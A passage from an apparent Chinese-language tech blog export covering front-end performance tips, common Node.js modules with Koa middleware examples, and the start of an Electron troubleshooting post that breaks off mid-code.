</li><li>图片优化<ul><li>图片压缩: 适当缩小尺寸、分辨率、选择高压缩率的格式，有损格式应该用 JPEG，无损格式应该用 Webp 格式。合并照片</li><li>小图片使用base64</li><li>图标使用svg，使用svgo压缩</li><li>代码绘制代替图片：一些可以用代码画出来的素材，渐变大背景图</li></ul></li></ul><p><br></p><h3 id="2-渲染层面"><a href="#2-渲染层面" class="headerlink" title="2. 渲染层面"></a>2. 渲染层面</h3><ol><li>渲染优化<ul><li>减少页面重排、重绘：<a href="https://www.notion.so/8d865ce2e9474b74b499fc8398ca5a9d" target="_blank" rel="noopener">回流、重绘、合成</a> </li><li>少用高性能CSS属性：浮动、定位</li><li>选择器优化：避免层级过深，尽量不适用tag选择器，因为CSS选择符是从右到左进行匹配的，会匹配到很多元素</li></ul></li><li><em>事件委托</em>：避免太多事件处理器被添加到DOM元素上</li><li><em>虚拟列表</em>：避免页面元素太多造成卡顿</li><li><em>内存管理</em>：及时解除事件监听、清除定时器，避免内存泄漏</li><li><em>ServiceWorker</em>：开销大的操作新开一个线程操作，避免造成卡顿</li><li>事件防抖和节流</li><li>组件级优化<ul><li>减少使用内联函数的写法<code>v-click=&quot;() =&gt; {}&quot;</code>，减少不必要的渲染</li><li><code>useMemo</code>, <code>useCallback</code>, <code>v-once/v-memo</code>手动标记缓存组件和计算结果，也是为了减少不必要的渲染</li><li>vue3中使用<code>shallowRef</code>代替放弃深层响应性，只有<code>.value</code>的访问被追踪。浅层ref可避免大型数据的响应性开销</li></ul></li><li>减少http请求: vuex, redux保留全局数据</li><li>组件懒加载: <code>() =&gt; import()</code>异步加载组件</li></ol><p>10.用ImmerJS: 使用<code>Proxy</code>实现了数据拷贝，数据修改开销更小 </p><p><br></p><h3 id="3-性能监控指标"><a href="#3-性能监控指标" class="headerlink" title="3. 性能监控指标"></a>3. 性能监控指标</h3><p>指标    目标值    测量工具<br>首屏加载时间（FCP）    &lt;1.5 秒    Lighthouse<br>最大内容绘制（LCP）    &lt;2.5 秒    Web Vitals<br>输入延迟（INP）    &lt;200 毫秒    Chrome DevTools<br>JavaScript 执行时间    &lt;300 毫秒    Performance 面板</p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.cnblogs.com/xianyulaodi/p/5755079.html" target="_blank" rel="noopener">雅虎前端优化的35条军规</a></li><li><a href="https://www.zhihu.com/search?type=content&amp;q=%E9%9B%85%E8%99%8E%20%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" target="_blank" rel="noopener">【性能优化指南】和你一起全面了解前端性能优化</a></li><li><a href="https://juejin.im/post/5c4418006fb9a049c043545e" target="_blank" rel="noopener">2019 前端性能优化年度总结</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>NodeJS常用模块</title>
      <link href="/2019/09/26/NodeJS%E6%96%87%E6%A1%A3/"/>
      <url>/2019/09/26/NodeJS%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<p>Node.js 不是一门语言也不是框架，它只是基于 Google V8 引擎的 JavaScript 运行时环境，同时结合 Libuv 扩展了 JavaScript 功能，使之支持 io、fs 等只有语言才有的特性，使得 JavaScript 能够同时具有 DOM 操作(浏览器)和 I/O、文件读写、操作数据库(服务器端)等能力，是目前最简单的全栈式语言。</p><h3 id="1-全局对象"><a href="#1-全局对象" class="headerlink" title="1. 全局对象"></a>1. 全局对象</h3><p><em>真正的全局对象</em></p><ul><li>Buffer</li><li>process</li><li>console</li><li>clearInterval、setInterval</li><li>clearTimeout、setTimeout</li><li>global</li></ul><p><em>模块级别的全局对象</em></p><ul><li>__dirname： 获取当前文件所在的路径，不包括后面的文件名</li><li>__filename：获取当前文件所在的路径和文件名称，包括后面的文件名称</li><li>exports</li><li>module</li><li>require</li></ul><p><br></p><h3 id="2-process"><a href="#2-process" class="headerlink" title="2. process"></a>2. process</h3><p>当前 Node.js 进程的信息</p><ul><li>process.env：环境变量，例如通过 `process.env.NODE_ENV 获取不同环境项目配置信息</li><li>process.argv：传入的命令行参数</li><li>process.nextTick：这个在谈及 EventLoop 时经常为会提到</li><li>process.pid：获取当前进程id</li><li>process.ppid：当前进程对应的父进程</li><li>process.cwd()：获取当前进程工作目录，</li><li>process.platform：获取当前进程运行的操作系统平台</li><li>process.uptime()：当前进程已运行时间，例如：pm2 守护进程的 uptime 值</li><li>进程事件： process.on(‘uncaughtException’,cb) 捕获异常信息、 process.on(‘exit’,cb）进程推出监听</li><li>三个标准流： process.stdout 标准输出、 process.stdin 标准输入、 process.stderr 标准错误输出</li><li>process.title 指定进程名称，有的时候需要给进程指定一个名称</li></ul><p><br></p><h3 id="3-fs"><a href="#3-fs" class="headerlink" title="3. fs"></a>3. fs</h3><p>读取本地文件的能力</p><ul><li>文件读取: readFileSync, fs.readFile</li><li>文件写入：writeFileSync, writeFile</li><li>文件追加写入：appendFileSync，appendFile</li><li>文件拷贝：copyFileSync，copyFile</li><li>创建目录：mkdirSync，mkdir<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">let</span> buf = fs.readFileSync(<span class="string">"1.txt"</span>);</span><br><span class="line"><span class="keyword">let</span> data = fs.readFileSync(<span class="string">"1.txt"</span>, <span class="string">"utf8"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf); <span class="comment">// &lt;Buffer 48 65 6c 6c 6f&gt;</span></span><br><span class="line"><span class="built_in">console</span>.log(data); <span class="comment">// Hello</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-buffer-缓冲区"><a href="#4-buffer-缓冲区" class="headerlink" title="4. buffer(缓冲区)"></a>4. buffer(缓冲区)</h3><p>Buffer就是在内存中开辟一片区域（初次初始化为8KB），用来存放二进制数据。如果数据到达的速度比进程消耗的速度快，那么少数早到达的数据会处于等待区等候被处理。反之，如果数据到达的速度比进程消耗的数据慢，那么早先到达的数据需要等待一定量的数据到达之后才能被处理。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> inputStream = fs.createReadStream(<span class="string">'input.txt'</span>); <span class="comment">// 创建可读流</span></span><br><span class="line"><span class="keyword">const</span> outputStream = fs.createWriteStream(<span class="string">'output.txt'</span>); <span class="comment">// 创建可写流</span></span><br><span class="line">inputStream.pipe(outputStream); <span class="comment">// 管道读写</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-Stream"><a href="#5-Stream" class="headerlink" title="5. Stream"></a>5. Stream</h3><p>流（Stream），是一个数据传输手段，是端到端信息交换的一种方式，而且是有顺序的,是逐块读取数据、处理内容，用于顺序读取输入或写入输出。</p><ul><li>createReadStream</li><li>createWriteStream</li><li>get请求返回给客户端<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> server = http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> method = req.method; <span class="comment">// 获取请求方法</span></span><br><span class="line">  <span class="keyword">if</span> (method === <span class="string">'GET'</span>) &#123; <span class="comment">// get 请求</span></span><br><span class="line">    <span class="keyword">const</span> fileName = path.resolve(__dirname, <span class="string">'data.txt'</span>);</span><br><span class="line">    <span class="keyword">let</span> stream = fs.createReadStream(fileName);</span><br><span class="line">    stream.pipe(res); <span class="comment">// 将 res 作为 stream 的 dest</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-EventEmit"><a href="#6-EventEmit" class="headerlink" title="6. EventEmit"></a>6. EventEmit</h3><p>观察者模式，被观察者(主体)维护着一组其他对象派来(注册)的观察者，有新的对象对主体感兴趣就注册观察者，不感兴趣就取消订阅，主体有更新的话就依次通知观察者们<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现代码</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.events = &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  on(type, handler) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.events[type]) &#123;</span><br><span class="line">      <span class="keyword">this</span>.events[type] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.events[type].push(handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  addListener(type,handler)&#123;</span><br><span class="line">    <span class="keyword">this</span>.on(type,handler)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  prependListener(type, handler) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.events[type]) &#123;</span><br><span class="line">      <span class="keyword">this</span>.events[type] = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.events[type].unshift(handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  removeListener(type, handler) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.events[type]) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.events[type] = <span class="keyword">this</span>.events[type].filter(<span class="function"><span class="params">item</span> =&gt;</span> item !== handler);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  off(type,handler)&#123;</span><br><span class="line">    <span class="keyword">this</span>.removeListener(type,handler)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  emit(type, ...args) &#123;</span><br><span class="line">    <span class="keyword">this</span>.events[type].forEach(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">Reflect</span>.apply(item, <span class="keyword">this</span>, args);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  once(type, handler) &#123;</span><br><span class="line">    <span class="keyword">this</span>.on(type, <span class="keyword">this</span>._onceWrap(type, handler, <span class="keyword">this</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _onceWrap(type, handler, target) &#123;</span><br><span class="line">    <span class="keyword">const</span> state = &#123; <span class="attr">fired</span>: <span class="literal">false</span>, handler, type , target&#125;;</span><br><span class="line">    <span class="keyword">const</span> wrapFn = <span class="keyword">this</span>._onceWrapper.bind(state);</span><br><span class="line">    state.wrapFn = wrapFn;</span><br><span class="line">    <span class="keyword">return</span> wrapFn;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _onceWrapper(...args) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.fired) &#123;</span><br><span class="line">      <span class="keyword">this</span>.fired = <span class="literal">true</span>;</span><br><span class="line">      <span class="built_in">Reflect</span>.apply(<span class="keyword">this</span>.handler, <span class="keyword">this</span>.target, args);</span><br><span class="line">      <span class="keyword">this</span>.target.off(<span class="keyword">this</span>.type, <span class="keyword">this</span>.wrapFn);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-path"><a href="#7-path" class="headerlink" title="7. path"></a>7. path</h3><p><br></p><h3 id="8-中间件"><a href="#8-中间件" class="headerlink" title="8. 中间件"></a>8. 中间件</h3><p>在NodeJS中，中间件指封装<code>http</code>请求细节处理的方法，如express, koa里，通过将公共逻辑的处理编写在中间件中，可以不用在每一个接口回调中做相同的代码编写。</p><p><img src="/2019/09/26/NodeJS文档/1.jpg" style="width:300px"></p><ul><li><p>token校验</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">options</span>) =&gt;</span> <span class="keyword">async</span> (ctx, next) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = ctx.header.authorization</span><br><span class="line">    <span class="keyword">if</span> (token) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> verify(token) <span class="comment">// 验证 token，并获取用户相关信息</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> next() <span class="comment">// 进入下一个中间件</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>日志模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">options</span>) =&gt;</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> startTime = <span class="built_in">Date</span>.now()</span><br><span class="line">  <span class="keyword">const</span> requestTime = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">  <span class="keyword">await</span> next()</span><br><span class="line">  <span class="keyword">const</span> ms = <span class="built_in">Date</span>.now() - startTime;</span><br><span class="line">  <span class="keyword">let</span> logout = <span class="string">`<span class="subst">$&#123;ctx.request.ip&#125;</span> -- <span class="subst">$&#123;requestTime&#125;</span> -- <span class="subst">$&#123;ctx.method&#125;</span> -- <span class="subst">$&#123;ctx.url&#125;</span> -- <span class="subst">$&#123;ms&#125;</span>ms`</span>;</span><br><span class="line">  <span class="comment">// 输出日志文件</span></span><br><span class="line">  fs.appendFileSync(<span class="string">'./log.txt'</span>, logout + <span class="string">'\n'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>koa-bodyParser<br>将我们的 post 请求和表单提交的查询字符串转换成对象，并挂在 ctx.request.body 上，方便我们在其他中间件或接口处取值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文件：my-koa-bodyparser.js</span></span><br><span class="line"><span class="keyword">const</span> querystring = <span class="built_in">require</span>(<span class="string">"querystring"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">bodyParser</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 存储数据的数组</span></span><br><span class="line">      <span class="keyword">let</span> dataArr = [];</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 接收数据</span></span><br><span class="line">      ctx.req.on(<span class="string">"data"</span>, data =&gt; dataArr.push(data));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 整合数据并使用 Promise 成功</span></span><br><span class="line">      ctx.req.on(<span class="string">"end"</span>, () =&gt; &#123;</span><br><span class="line">        <span class="comment">// 获取请求数据的类型 json 或表单</span></span><br><span class="line">        <span class="keyword">let</span> contentType = ctx.get(<span class="string">"Content-Type"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取数据 Buffer 格式</span></span><br><span class="line">        <span class="keyword">let</span> data = Buffer.concat(dataArr).toString();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (contentType === <span class="string">"application/x-www-form-urlencoded"</span>) &#123;</span><br><span class="line">          <span class="comment">// 如果是表单提交，则将查询字符串转换成对象赋值给 ctx.request.body</span></span><br><span class="line">          ctx.request.body = querystring.parse(data);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (contentType === <span class="string">"applaction/json"</span>) &#123;</span><br><span class="line">          <span class="comment">// 如果是 json，则将字符串格式的对象转换成对象赋值给 ctx.request.body</span></span><br><span class="line">          ctx.request.body = <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行成功的回调</span></span><br><span class="line">        resolve();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 继续向下执行</span></span><br><span class="line">    <span class="keyword">await</span> next();</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>koa-static<br>是在服务器接到请求时，帮我们处理静态文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"><span class="keyword">const</span> mime = <span class="built_in">require</span>(<span class="string">"mime"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; promisify &#125; = <span class="built_in">require</span>(<span class="string">"util"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 stat 和 access 转换成 Promise</span></span><br><span class="line"><span class="keyword">const</span> stat = promisify(fs.stat);</span><br><span class="line"><span class="keyword">const</span> access = promisify(fs.access)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> (<span class="params">dir</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">      <span class="comment">// 将访问的路由处理成绝对路径，这里要使用 join 因为有可能是 /</span></span><br><span class="line">      <span class="keyword">let</span> realPath = path.join(dir, ctx.path);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 获取 stat 对象</span></span><br><span class="line">        <span class="keyword">let</span> statObj = <span class="keyword">await</span> stat(realPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果是文件，则设置文件类型并直接响应内容，否则当作文件夹寻找 index.html</span></span><br><span class="line">        <span class="keyword">if</span> (statObj.isFile()) &#123;</span><br><span class="line">          ctx.set(<span class="string">"Content-Type"</span>, <span class="string">`<span class="subst">$&#123;mime.getType()&#125;</span>;charset=utf8`</span>);</span><br><span class="line">          ctx.body = fs.createReadStream(realPath);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> filename = path.join(realPath, <span class="string">"index.html"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 如果不存在该文件则执行 catch 中的 next 交给其他中间件处理</span></span><br><span class="line">          <span class="keyword">await</span> access(filename);</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 存在设置文件类型并响应内容</span></span><br><span class="line">          ctx.set(<span class="string">"Content-Type"</span>, <span class="string">"text/html;charset=utf8"</span>);</span><br><span class="line">          ctx.body = fs.createReadStream(filename);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.zhihu.com/search?type=content&amp;q=nodejs%E6%96%87%E6%A1%A3" target="_blank" rel="noopener">一篇文章构建你的 NodeJS 知识体系</a></li><li><a href="https://i5ting.github.io/How-to-learn-node-correctly/" target="_blank" rel="noopener">狼叔：如何正确的学习Node.js</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Electron碰到的问题</title>
      <link href="/2019/09/19/electron%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/2019/09/19/electron%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      <content type="html"><![CDATA[<blockquote><p>项目使用create-react-app搭建，本地开发时候，先跑起一个WebServer，再用electron加载<code>localhost:8000</code>页面，走的是http协议。打包后，因为访问的是本地文件，走的是file协议。因此会出现不少问题…</p></blockquote><p><br></p><h3 id="1-渲染进程使用Node模块"><a href="#1-渲染进程使用Node模块" class="headerlink" title="1. 渲染进程使用Node模块"></a>1. 渲染进程使用Node模块</h3><p>Node. js 的所有 内置模块 都在Electron中可用， 第三方 node 模块中也完全支持。渲染进程除了额外能够使用node模块的能力外，与普通网页没有什么区别<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> &#123; app &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>).remote</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(app.getVersion())</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-请求-url-为绝对路径"><a href="#2-请求-url-为绝对路径" class="headerlink" title="2. 请求 url 为绝对路径"></a>2. 请求 url 为绝对路径</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> host =</span><br><span class="line">  process.env.NODE_ENV === <span class="string">'development'</span> ? <span class="string">''</span> : <span class="string">'http://v3.yingliboke.cn/api'</span>;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-路由失效"><a href="#3-路由失效" class="headerlink" title="3. 路由失效"></a>3. 路由失效</h3><p>一开始用的 React-router 的 <code>&lt;BrowserRouter&gt;</code>打开后，页面一片空白。要使用<code>&lt;HashRouter&gt;</code>，并设置<code>hashType: &#39;noslash&#39;</code> -&gt; <code>index.html#liveroom</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Router.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; HashRouter, Route &#125; <span class="keyword">from</span> <span class="string">'react-router-dom'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="function"><span class="keyword">function</span> <span class="title">AppRouter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;HashRouter hashType=<span class="string">"noslash"</span>&gt;</span><br><span class="line">      &lt;Route exact path=<span class="string">"/"</span> component=&#123;Login&#125; /&gt;</span><br><span class="line">      &lt;Route path=<span class="string">"/liveroom"</span> component=&#123;Liveroom&#125; /&gt;</span><br><span class="line">    &lt;<span class="regexp">/HashRouter&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p>electron 入口文件，打包后可以直接进入liveroom路由<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> startUrl;</span><br><span class="line"><span class="keyword">if</span> (isDev) &#123;</span><br><span class="line">  startUrl = <span class="string">'http://localhost:8000#liveroom'</span>;</span><br><span class="line">  mainWindow.loadURL(startUrl);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  startUrl = url.format(&#123;</span><br><span class="line">    pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">    protocol: <span class="string">'file:'</span>,</span><br><span class="line">    slashes: <span class="literal">false</span>,</span><br><span class="line">    hash: <span class="string">'liveroom'</span></span><br><span class="line">  &#125;);</span><br><span class="line">  mainWindow.loadURL(startUrl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-window-location不可用"><a href="#4-window-location不可用" class="headerlink" title="4. window.location不可用"></a>4. window.location不可用</h3><p>当使用 api(如 webContents.loadURL 和 webContents.back) 来修改导航的时候，这个事件将不会发出，它也不会在页内发生跳转。<br>使用<code>did-navigate-in-page</code>事件可以监听到 —— 点击锚链接或更新 window.location.hash。调用 event.preventDefault() 可以默认事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 